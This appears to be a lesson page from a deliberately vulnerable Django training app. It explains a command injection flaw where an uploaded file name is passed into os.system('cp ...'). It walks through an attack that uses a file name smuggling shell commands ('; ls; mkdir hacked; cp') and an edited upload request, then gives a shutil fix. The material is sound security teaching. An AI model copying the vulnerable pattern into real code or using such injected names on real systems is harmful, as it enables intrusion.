# A1: Command Injection

### Description

An OS command injection attack occurs when an attacker tries to execute system level commands through a vulnerable application.

The vulnerability can be found at app/models/Benefits/benefits.py
```
@staticmethod
def save_data(file, backup=None):
    data_path = os.path.join(settings.MEDIA_ROOT, "data")
    full_file_name = os.path.join(data_path, file.name)
    # the uploaded file is read at once, as duplicated in railsgoat
    # use file.chunk() in a loop can prevent overwhelming system memory
    content = ContentFile(file.read())
    default_storage.save(full_file_name, content)
    if backup == "true":
        return Benefits.make_backup(file, data_path, full_file_name)

@staticmethod
@silence_streams
def make_backup(file, data_path, full_file_name):
    if os.path.isfile(full_file_name):
        epoch_time = int(time.time())
        bak_file_path = "%s/bak%d_%s" % (data_path, epoch_time, file.name)
        # intended vulnerability for command injection
        os.system("cp %s %s" % (full_file_name, bak_file_path))
        return bak_file_path
```

The code executes system level command with user uploaded file name in string. A user can upload a file named with system commands to execute a command injection attack.

### Why would someone do this?

When people try to copy a file from source to destination in their own computer, the system command cp may be the most intuitive option.

However, it is not a good practice to interpolate user input string into a system command.

### Attack

This is one way of doing a command injection:
1. Set up an intercepting proxy
2. Create a file named "; ls; mkdir hacked; cp"
3. Login and navigate to benefit forms page
4. Upload the file "; ls; mkdir hacked; cp"
5. Intercept the POST request, which should look like:
    ```
    ------WebKitFormBoundary0tXzAPCVysul0K4b
    Content-Disposition: form-data; name="csrfmiddlewaretoken"
     
    W8E9x5u23dYaKOrLZus6XG2j99fZfu8uGMs73HnV2fvP2Yqc9UVQD8Pkgq8UYIRQ
    ------WebKitFormBoundary0tXzAPCVysul0K4b
    Content-Disposition: form-data; name="myfile"; filename="; ls; mkdir hacked; cp"
    Content-Type: application/octet-stream
     
     
    ------WebKitFormBoundary0tXzAPCVysul0K4b
    Content-Disposition: form-data; name="backup"
     
    False
    ------WebKitFormBoundary0tXzAPCVysul0K4b--
    ```
6. Change the False to true at backup, resend the request, the new request should look like:
    ```
    ------WebKitFormBoundary0tXzAPCVysul0K4b
    Content-Disposition: form-data; name="csrfmiddlewaretoken"
     
    W8E9x5u23dYaKOrLZus6XG2j99fZfu8uGMs73HnV2fvP2Yqc9UVQD8Pkgq8UYIRQ
    ------WebKitFormBoundary0tXzAPCVysul0K4b
    Content-Disposition: form-data; name="myfile"; filename="; ls; mkdir hacked; cp"
    Content-Type: application/octet-stream
     
     
    ------WebKitFormBoundary0tXzAPCVysul0K4b
    Content-Disposition: form-data; name="backup"
     
    true
    ------WebKitFormBoundary0tXzAPCVysul0K4b--
    ```
7. You should be able to see 'ls' is executed from terminal, and there is a newly created directory named 'hacked' in DjanGoat base directory.

### Solution

Instead of directly using system calls, we can use file modules such as ```shutil``` to help copy the file.